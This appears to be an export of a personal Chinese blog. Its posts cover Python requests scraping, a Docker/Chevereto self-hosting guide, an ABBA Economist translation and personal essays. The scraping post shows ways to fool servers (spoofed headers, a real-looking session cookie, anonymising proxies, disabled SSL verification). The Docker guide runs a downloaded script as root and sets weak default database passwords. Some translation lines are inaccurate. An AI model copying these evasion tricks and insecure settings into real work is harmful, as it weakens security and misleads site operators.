<li>下载源码压缩包，解压缩后，进入目录，执行<code>python setup.py install</code><h3 id="requests发送get请求"><a href="#requests发送get请求" class="headerlink" title="requests发送get请求"></a>requests发送get请求</h3></li>
<li>普通请求  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure>
  使用requests模块发起的请求，请求头的User-Agent字段是<code>python-requests/2.22.0</code>，太容易被发现了！伪装指数：一颗星。<br>  <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0l3ogjedj312u02vq32.jpg" alt="requests库的User-Agent.png"></li>
<li>带headers的请求<br>  就是带上http请求头，提升伪装指数。最常用的是带上User-Agent和Cookie字段，需要定义为字典格式。<br>  用法：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763&quot;</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>,headers=headers)</span><br></pre></td></tr></table></figure>
  现在，就伪装成正常用户的User-Agent了。<br>  <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0lfdq72dj316107vtaa.jpg" alt="伪装的User-Agent.png"></li>
<li>带参数的请求<br>  很多时候，我们需要带上参数，才获取得到想要的数据。requests模块会帮助我们的。<br>  <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0mq4haqtj31f60u00ws.jpg" alt="image.png"><br>  <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0ma3u1o5j31f60u043j.jpg" alt="image.png"><br>  比如我进入百度（用手机模式进行操作，手机模式通常比电脑模式更简洁），搜索【陈奕迅】，通过开发者工具，看到我输入的参数名称是word。找到这个信息和请求url，就可以模仿模拟器了~<br>  <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0mmown5xj317309cact.jpg" alt="image.png"><br>  把cookie也带上。  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">kw = &#123;<span class="string">&quot;word&quot;</span>:<span class="string">&quot;陈奕迅&quot;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;BIDUPSID=5B552A67F4809A696EB411EBECB153B5; PSTM=1579323194; BAIDUID=5B552A67F4809A694DD0808B6CBC1E9B:FG=1; delPer=0; BD_HOME=0; BD_UPN=12314753; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; BD_CK_SAM=1; PSINO=2; H_PS_PSSID=1430_21086_30495_30501; H_PS_645EC=8327uw5uHbT5t%2BUS3ka0l7KioqlTqXRxdp1H14anTPhYbz0M8Z9bBpMQA0E; WWW_ST=1579323229822&quot;</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">&quot;https://www.baidu.com/s&quot;</span>,params=kw,headers=headers)</span><br></pre></td></tr></table></figure>
  现在服务器就被骗啦~~<br>  <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0mocf3qmj31840k6teg.jpg" alt="image.png"><h3 id="requests发送post请求"><a href="#requests发送post请求" class="headerlink" title="requests发送post请求"></a>requests发送post请求</h3>用法：data是字典格式。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response = requests.post(<span class="string">&quot;http://www.baidu.com/&quot;</span>,data=data,headers=headers)</span><br></pre></td></tr></table></figure></li>
<li>模拟浏览器发送post请求，以百度翻译为例。<br>进入手机模式，观察请求发送的特征。我点击【翻译】，浏览器发了两条post请求。<ul>
<li>检测输入的语言<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0mwkaexcj31f60u0juo.jpg" alt="image.png"></li>
<li>将输入内容翻译为英文<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0mxq8uc6j31f60u077v.jpg" alt="image.png"></li>
</ul>
</li>
</ul>
<p>先做个简单的，就模拟第二条post请求，将【下雨了】翻译成英文。<br>post是这样的，把这部分内容做成字典格式，就可以开始写代码了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0n3i56rfj31f60u0gp3.jpg" alt="image.png"><br>遇到了问题，暂时按下不表，等会儿集中完成爬虫练习。这里是需要用python代码实现一个翻译小工具。</p>
<p><a href="https://dana5haw.com/2020/01/18/python爬虫实例之翻译接口/">做出来啦</a></p>
<h3 id="使用代理发送请求"><a href="#使用代理发送请求" class="headerlink" title="使用代理发送请求"></a>使用代理发送请求</h3><p>get和post都可以用代理发送请求。这个伪装手段就是隐藏自己的真实IP，相当于改名行走江湖的人。<br>proxies也是字典格式。代理IP到网上找，一般使用高匿代理。比如<a href="https://proxy.mimvp.com/">这里有代理IP</a><br>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxies = &#123; </span><br><span class="line">	<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://IP:port&quot;</span>, </span><br><span class="line">	<span class="string">&quot;https&quot;</span>: <span class="string">&quot;https://IP:port&quot;</span>, </span><br><span class="line">	&#125;</span><br><span class="line">requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>, proxies = proxies)</span><br></pre></td></tr></table></figure>
<p>用法很简单，定义proxies字典之后，在requests中添加参数proxies就行了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0uoyxmw7j316v08nt9s.jpg" alt="image.png"></p>
<h3 id="使用session获取登录后的页面"><a href="#使用session获取登录后的页面" class="headerlink" title="使用session获取登录后的页面"></a>使用session获取登录后的页面</h3><p>为了获取登录之后的页面，我们必须发送带有cookies的请求。<br>用法：</p>
<ul>
<li>实例化一个session对象</li>
<li>让session发送get或者post请求</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line">response = session.get(url,headers)</span><br></pre></td></tr></table></figure>

<p><a href="https://dana5haw.com/2020/01/18/python爬虫实例之使用session发送请求-抓取登录后的页面/">实例练习</a></p>
<h3 id="requests使用的小技巧"><a href="#requests使用的小技巧" class="headerlink" title="requests使用的小技巧"></a>requests使用的小技巧</h3><ul>
<li>把cookie对象转化为字典<br>  <code>requests.utils.dict_from_cookiejar(cookies对象)</code></li>
<li>请求SSL证书无效的网站<br>  <code>response = requests.get(&quot;https://www.12306.cn/mormhweb/ &quot;,verify=False)</code></li>
<li>设置超时<br>  <code>response = requests.get(url,timeout=10)</code></li>
<li>配合状态码判断是否请求成功<br>  assert就是下断言，预先判定认为条件成立。就像你买彩票，假定自己会中奖。<br>  <code>assert response.status_code == 200</code></li>
</ul>
<p><a href="https://dana5haw.com/2020/01/18/python爬虫实例之requests使用小技巧/">在这里练习的</a></p>
<hr>
<p>实例操作，先放一下，休息一会儿继续。就另写几篇，一个实验写一篇，包括实验过程和总结。</p>
]]></content>
      <categories>
        <category>基础知识大漫灌</category>
        <category>python爬虫通识</category>
      </categories>
      <tags>
        <tag>学习总结</tag>
        <tag>爬虫通识</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫通识（二）总结</title>
    <url>//posts/ZH-CN/Spider_Summary_Two.html</url>
    <content><![CDATA[<h2 id="知识树"><a href="#知识树" class="headerlink" title="知识树"></a>知识树</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb3evjstfgj333h1ej7e3.jpg" alt="通用爬虫通识（二）.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>主要就是学习数据提取的方式。我们使用爬虫获取到html页面或者是json字符串之后，要从中提取有用的数据，过滤掉无用信息。<br>通看了教程，其实不难入门。多练习使用正则表达式和xpath将html这种非结构化数据类型转换为结构化数据类型（如：json和xml）。<br>今天有点晚了，明天完成练习。<br>值得安装的浏览器插件：<code>jsonview</code>、<code>XPath Helper</code>。</p>
]]></content>
      <categories>
        <category>基础知识大漫灌</category>
        <category>python爬虫通识</category>
      </categories>
      <tags>
        <tag>学习总结</tag>
        <tag>爬虫通识</tag>
      </tags>
  </entry>
  <entry>
    <title>瑞典乐队ABBA回归</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-94day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-94天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Been waiting for you: ABBA returns</p>
<p>等你：ABBA回归</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/04/abba-band.jpg" alt="abba-band.jpg"></p>
<p>The Swedish pop group disbanded almost 40 years ago but the music still goes on.</p>
<p>瑞典流行乐队ABBA在40年前就解散了，但他们的音乐至今仍在流传。</p>
<p>A greatest hits album released in 1992 cracked the Billboard Top 40 in September.</p>
<p>9月，ABBA发行于1992年的专辑（ABBA Gold: Greatest Hits）冲上了Billboard Top40榜单。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/04/abba-gold.png" alt="abba-gold.png"></p>
<p>More than 65m people have seen “Mamma Mia!”, a stage show of 1999.</p>
<p>超650万观众都看过1999年舞台秀“妈妈咪呀”。</p>
<p>The film adaptation, released in 2008, and its sequel, from 2018, grossed over $1bn at the box office between them.</p>
<p>“妈妈咪呀”的改编电影（上映于2008年）和续集（上映于2018年）的票房毛利润超过了10亿美元。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/04/mammamia.jpg" alt="mammamia.jpg"></p>
<p>For decades fans had a dream of a reunion, only to be disillusioned.</p>
<p>这几十年间，粉丝们一直希望乐队复合，但这一梦想最终还是幻灭。</p>
<p>In 2000 ABBA refused $1bn to perform 100 shows.</p>
<p>2000年，ABBA拒绝了出价10亿美元的100场演唱会。</p>
<p>In 2014 Bjorn Ulvaeus hinted fans might want to move on.</p>
<p>2014年，Bjorn Ulvaeus表示，粉丝可能还是希望乐队复合。</p>
<p>But ABBA couldn’t escape if they wanted to.</p>
<p>ABBA注定要复合，想逃也逃不掉。</p>
<p>On Friday they release a new album, “Voyage”.</p>
<p>周五，他们发行了新专辑“Voyage”。</p>
<p>A custom-built arena in London will host concerts, but the singers aren’t performing.</p>
<p>ABBA将在伦敦定制舞台举办演唱会，但是歌手并不出场。</p>
<p>（这个演唱会就是3D全息演唱会）</p>
<p>Instead, they used motion-capture technology to create digital “ABBAtars”.</p>
<p>“ABBA歌星”是运用动作捕捉技术生成数字化（人物）。</p>
<p>Naysayers will argue it’s all motivated by money, money, money.</p>
<p>反对者会认为一切都是靠金钱力量驱使的。</p>
<p>The fans will just be thankful for the music.</p>
<p>但是粉丝只是感谢音乐。</p>
<p>早上发的文章被禁止了°の ABBA乐队是继Beatles之后最知名的乐队。</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>爱情不过是场权谋游戏</title>
    <url>//posts/ZH-CN/love-game.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前言不搭后语。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="后语"><a href="#后语" class="headerlink" title="后语"></a>后语</h2><p>爱情不过是场权谋游戏，男男女女在这场游戏里博弈。长大以前，我爱你就足够。人长大了，就学会计较得失。你爱我吗？你有我爱你那么多吗？你愿意为我放弃其他人或事吗？这些问题成了各自心中的一杆秤。大家开始不自觉地开始计算投入产出比，就像世界上的任何一种投资那样。这样的变化不是不对，只是爱情比玻璃还脆弱，比温室里的花朵还经不起风吹雨打。没有最爱，没有更爱，只是错爱。我很善变，善变到自己都不想承认。</p>
]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>爱情</tag>
      </tags>
  </entry>
  <entry>
    <title>用docker方式自建图床chevereto</title>
    <url>//posts/ZH-CN/Docker-Image-Hosting-Chevereto.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前使用的是公共图床：<code>微博图床</code>，把图片存在其他平台其实风险很高，那就把vps利用起来，自建图床吧。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><ul>
<li>操作系统：ubuntu18.04</li>
<li>已安装软件：nginx（反向代理，web站点）、v2ray（用于科学上网）、modsecurity（WAF）</li>
</ul>
<h2 id="图床软件选择"><a href="#图床软件选择" class="headerlink" title="图床软件选择"></a>图床软件选择</h2><p>google了一圈，现在最流行的就是chevereto这款图床开源软件了，有免费版，咱就用免费版足够了。</p>
<h2 id="我选择用docker部署"><a href="#我选择用docker部署" class="headerlink" title="我选择用docker部署"></a>我选择用docker部署</h2><p>安装部署chevereto的方式有很多，我选了最省事的方法——docker。docker相当于是一个盒子，把安装chevereto软件的环境都集成到里面，我们把这个盒子做好，再装上chevereto软件就可以直接运行了。docker为我们节省了集成安装环境的步骤和时间。</p>
<h3 id="安装docker-ce"><a href="#安装docker-ce" class="headerlink" title="安装docker-ce"></a>安装docker-ce</h3><p>参考<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">官网</a>，用脚本安装的方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># curl -fsSL https://get.docker.com -o get-docker.sh</span></span><br><span class="line">root@vultr:~<span class="comment"># sh get-docker.sh</span></span><br></pre></td></tr></table></figure>
<p>用<code>docker version</code>检查版本号。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># docker version</span></span><br></pre></td></tr></table></figure>
<p>试运行hello-world镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># docker run hello-world</span></span><br></pre></td></tr></table></figure>
<h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><p>在github找到<a href="https://github.com/docker/compose/releases">docker-compose的最新版本</a>，按照官方提供的方法进行安装。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd4cdxpxp6j31f60u0wi4.jpg" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># curl -L https://github.com/docker/compose/releases/download/1.25.4/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span></span><br><span class="line">root@vultr:~<span class="comment"># chmod +x /usr/local/bin/docker-compose</span></span><br><span class="line">root@vultr:~<span class="comment"># docker-compose --version</span></span><br><span class="line">docker-compose version 1.25.4, build 8d51620a</span><br></pre></td></tr></table></figure>
<p><code>docker-compose --version</code>是用于查看docker-compose是否安装成功，能正常显示版本号，就说明安装成功了。</p>
<h3 id="配置docker-compose-yml"><a href="#配置docker-compose-yml" class="headerlink" title="配置docker-compose.yml"></a>配置docker-compose.yml</h3><p>就在root家目录操作吧。<code>vi docker-compose.yml</code>新建配置文件（这是官方建议的配置）：</p>
<details><summary>点击展开docker-compose.yml</summary>
<p>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mariadb</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./database:/var/lib/mysql:rw</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">private</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">chevereto_root</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">chevereto</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">chevereto</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">chevereto</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">chevereto:</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nmtan/chevereto</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">private</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">CHEVERETO_DB_HOST:</span> <span class="string">db</span></span><br><span class="line">      <span class="attr">CHEVERETO_DB_USERNAME:</span> <span class="string">chevereto</span></span><br><span class="line">      <span class="attr">CHEVERETO_DB_PASSWORD:</span> <span class="string">chevereto</span></span><br><span class="line">      <span class="attr">CHEVERETO_DB_NAME:</span> <span class="string">chevereto</span></span><br><span class="line">      <span class="attr">CHEVERETO_DB_PREFIX:</span> <span class="string">chv_</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./chevereto_images:/var/www/html/images:rw</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf/php.ini:/usr/local/etc/php/conf.d/php.ini</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">private:</span></span><br></pre></td></tr></table></figure>

</p>
</details>

<p><strong>配置文件解读：<a href="https://yeasy.gitbooks.io/docker_practice/compose/compose_file.html">参考</a></strong></p>
<ul>
<li>用到两个镜像：<code>mariadb</code>和<code>nmtan/chevereto</code>。</li>
<li><code>image</code>指定为镜像名称或镜像ID。如果镜像在本地不存在，Compose将会尝试拉取这个镜像。</li>
<li><code>ports</code>的配置就是把容器内的80端口映射为本机的8080端口。</li>
<li><code>volumes</code>是数据卷所挂载路径设置。</li>
<li><code>environment</code>设置环境变量。</li>
</ul>
<h3 id="设置docker环境"><a href="#设置docker环境" class="headerlink" title="设置docker环境"></a>设置docker环境</h3><ul>
<li>创建目录，用于挂载数据卷：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># mkdir database chevereto_images conf</span></span><br></pre></td></tr></table></figure></li>
<li>创建配置文件<code>conf/php.ini</code>，修改上传文件大小的限制为256M（默认的大小是2M）。<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">PHP:</span><br><span class="line"><span class="attr">max_execution_time</span> = <span class="number">60</span><span class="comment">;</span></span><br><span class="line"><span class="attr">memory_limit</span> = <span class="number">256</span>M<span class="comment">;</span></span><br><span class="line"><span class="attr">upload_max_filesize</span> = <span class="number">256</span>M<span class="comment">;</span></span><br><span class="line"><span class="attr">post_max_size</span> =  <span class="number">256</span>M<span class="comment">;</span></span><br></pre></td></tr></table></figure></li>
<li>调整目录所属权限为www-data：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># chown -R www-data:www-data database chevereto_images conf</span></span><br></pre></td></tr></table></figure>
<h3 id="启动docker容器"><a href="#启动docker容器" class="headerlink" title="启动docker容器"></a>启动docker容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># docker-compose up -d</span></span><br></pre></td></tr></table></figure>
<h3 id="安装chevereto"><a href="#安装chevereto" class="headerlink" title="安装chevereto"></a>安装chevereto</h3><h4 id="测试docker启动是否正常"><a href="#测试docker启动是否正常" class="headerlink" title="测试docker启动是否正常"></a>测试docker启动是否正常</h4>开启防火墙的8080端口（因为docker容器开放的端口是8080）:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# ufw allow 8080</span><br></pre></td></tr></table></figure>
接下来在浏览器输入vps的外网IP+8080端口，就可以进行chevereto软件安装了。<br>安装过程傻瓜化。<a href="https://zealot.top/%E4%BD%BF%E7%94%A8Docker%E8%BD%BB%E6%9D%BE%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%9B%BE%E5%BA%8Achevereto.html">参考</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd4ezb2wq1j31f60u0dk0.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd4f2urrykj30tp0a9mxx.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd4f45z22dj31f60u0q6l.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd4f5857rhj31f60qqjt5.jpg" alt="image.png"><h4 id="用Nginx反向代理docker容器"><a href="#用Nginx反向代理docker容器" class="headerlink" title="用Nginx反向代理docker容器"></a>用Nginx反向代理docker容器</h4><a href="https://www.ioiox.com/archives/80.html">参考</a><br>接下来我们用nginx反向代理docker。为什么要用nginx反向代理？因为我不想增加vps开放的端口（不在互联网暴露docker的8080端口，降低安全风险）。<br>nginx的开放端口目前反向代理了v2ray和伪装网站。我们取消对伪装网站的代理，/路径直接代理docker容器的8080端口。<details><summary>nginx配置文件修改如下</summary>
<p>

</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## server部分增加对/路径的反向代理</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080;</span><br><span class="line"></span><br><span class="line">        proxy_set_header  Host                $http_host;</span><br><span class="line">        proxy_set_header  X-Real-IP           $remote_addr;</span><br><span class="line">        proxy_set_header  X-Forwarded-Ssl     on;</span><br><span class="line">        proxy_set_header  X-Forwarded-For     $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header  X-Forwarded-Proto   $scheme;</span><br><span class="line">        proxy_set_header  X-Frame-Options     SAMEORIGIN;</span><br><span class="line"></span><br><span class="line">        client_max_body_size        100m;</span><br><span class="line">        client_body_buffer_size     128k;</span><br><span class="line"></span><br><span class="line">        proxy_buffer_size           4k;</span><br><span class="line">        proxy_buffers               4 32k;</span><br><span class="line">        proxy_busy_buffers_size     64k;</span><br><span class="line">        proxy_temp_file_write_size  64k;</span><br><span class="line">    &#125;</span><br><span class="line">## 注释掉原本的Nginx模板网站的配置</span><br><span class="line"># /root/var/www/html;</span><br><span class="line"># index index.html index.htm index.nginx-debian.html;</span><br><span class="line"># location ~ .*\.(js|jpg|JPEG|css|bmp|gif|GIF|png)$ &#123;access_log off;&#125;</span><br></pre></td></tr></table></figure>

</p>
</details>

<div class="note info">
            <p><strong>注意：</strong>配置文件中的这一句<code>location ~ .*\.(js|jpg|JPEG|css|bmp|gif|GIF|png)$ {access_log off;}</code>默认不注释的话，将导致chevereto网站的静态资源无法显示。&lt;原因就是静态资源没有转发到docker容器，我们直接注释掉这一句，不单独设置静态资源的转发。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd4g07fb7lj31f60u0gnr.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd4hgcl33wj30rh0dsdgy.jpg" alt="image.png"></p>
          </div>

<p>好的，经过一番折腾，终于可以正常使用图床了，玩一玩：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd4hhgozn5j31f60u0x6q.jpg" alt="image.png"><br><a href="https://v2ray.dana5haw.com:8008/image/4Qd">我的图片</a></p>
<h3 id="给图片加水印"><a href="#给图片加水印" class="headerlink" title="给图片加水印"></a>给图片加水印</h3><p>之前看到有些博客的图片是加的统一水印，看起来可酷了~<br>这个图床也可以自定义水印图片~<br><a href="https://v2ray.dana5haw.com:8008/image/2k8"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/24/image54edcc7522f50cdd.png" alt="image54edcc7522f50cdd.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/O8Z"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/24/image0b5b6fdbc185d4ac.png" alt="image0b5b6fdbc185d4ac.png"></a><br>加了水印就是这样的效果。为了统一风格，我把主题的图片改成和水印一样的图片了。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/03/24/background.jpg" alt="background.jpg"><br><a href="https://v2ray.dana5haw.com:8008/image/sBU"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/24/image.png" alt="image.png"></a></p>
<h3 id="开放用户注册"><a href="#开放用户注册" class="headerlink" title="开放用户注册"></a>开放用户注册</h3><p>可以把图床提供给朋友使用，默认的配置是新用户注册时，站长会发送激活链接至用户邮箱。这就涉及到了邮件功能，chereveto默认用PHP函数发送邮件，但是这个默认的配置将导致邮件发不出去。<br><a href="https://v2ray.dana5haw.com:8008/image/bii"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/24/image737c92dbdd8c0799.png" alt="image737c92dbdd8c0799.png"></a><br>所以，我们选择SMTP方式给注册用户发送激活邮件。<br>我用Gmail邮箱设置的SMTP，在Gmail邮箱这边需要开启双重验证，获取专用密码（我之前设置过，已经有专用密码了，这个步骤就跳过，可参考<a href="https://www.yiyisoft.com/news/289.html">这篇教程</a>）<br>接下来进入chereveto的邮件设置，按照这个配置：<a href="https://www.newlearner.site/2018/12/05/chevereto.html">参考教程</a><br><a href="https://v2ray.dana5haw.com:8008/image/qgn"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/24/imaged09f239ce201f243.png" alt="imaged09f239ce201f243.png"></a><br>接下来，发送一封测试邮件，试一下站长邮箱能不能自动往外发送邮件：<br><a href="https://v2ray.dana5haw.com:8008/image/yGV"><img src="https://v2ray.dana5haw.com:8008/images/2020/03/24/image5615ef216cd0e898.png" alt="image5615ef216cd0e898.png"></a><br>终于可以开放用户注册使用自己的图床啦~</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还有很多功能可以摸索，这次的docker体验满分！docker真是一项伟大的发明。这个图床花了好多时间精力，昨天几乎通宵，很久没有这样的求知欲了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zealot.top/%E4%BD%BF%E7%94%A8Docker%E8%BD%BB%E6%9D%BE%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%9B%BE%E5%BA%8Achevereto.html">主要参考这篇文章进行docker镜像安装和chereveto软件的安装</a><br><a href="https://www.ioiox.com/archives/80.html">还参考了这篇文章用nginx代理docker容器的部分</a></p>
]]></content>
      <categories>
        <category>docker</category>
        <category>图床</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>ubuntu18.04</tag>
        <tag>自建图床</tag>
        <tag>chevereto</tag>
      </tags>
  </entry>
  <entry>
    <title>生育率降低导致什么</title>
    <url>//posts/ZH-CN/Born_Low.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>范仲淹附体，又到了忧国忧民的时候。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="生育率降低意味着什么"><a href="#生育率降低意味着什么" class="headerlink" title="生育率降低意味着什么"></a>生育率降低意味着什么</h2><p>这位网友脑洞清奇，但不得不说殡葬是一个极具前景的行业。看当下的新冠肺炎就知道了，火葬场忙都忙不过来。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcq648zizqj30o90890t7.jpg" alt="image.png"><br>这个网友也是幽默啊。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcq6bieiz1j30ny0kwn0o.jpg" alt="image.png"></p>
<h2 id="现在的想法"><a href="#现在的想法" class="headerlink" title="现在的想法"></a>现在的想法</h2><p>每当想到工资抵不上通货膨胀、要向天再借500年才能买得起房，心情就变得非常沮丧。小时候渴望成人的自由生活，不用上学、没有考试。把18岁作为成年的起始点，也已经过了5年的成人生活了。但是我真正意识到自己是个成人，也就是最近的事。工作差很远，爱情差很远，一桩桩、一件件，把我天真的幻想泡泡打破，残留破碎的彩虹。天下熙熙，皆为利来；天下攘攘，皆为利往。结婚是不可能的，生孩子更不可能。我接受不了背叛。越长大了，越觉得自己很残忍，一点一点地抹杀心中的小女孩，告诉她那些曾奉为圭臬的，都是骗人的。<br>昨天晚上就在想辞职的事，今天拖到现在还没说。结果下午突然有了一个公司邮箱账号，想想可真的讽刺十足，这个账号是为了让我写辞职信用的吗？<br>这都是四年前说的话了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcq7xpmeavj309u02cmx0.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>老龄化</tag>
        <tag>少子化</tag>
      </tags>
  </entry>
  <entry>
    <title>用浏览器F12的控制台任意调整YTB视频播放速度</title>
    <url>//posts/ZH-CN/F12_YTB_Speed.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意看到这个小技巧，F12打开浏览器开发者工具，在控制台输入代码，即可任意调整YTB视频的播放速度。</p>
<p><escape> <span id="more"></span></escape></p>
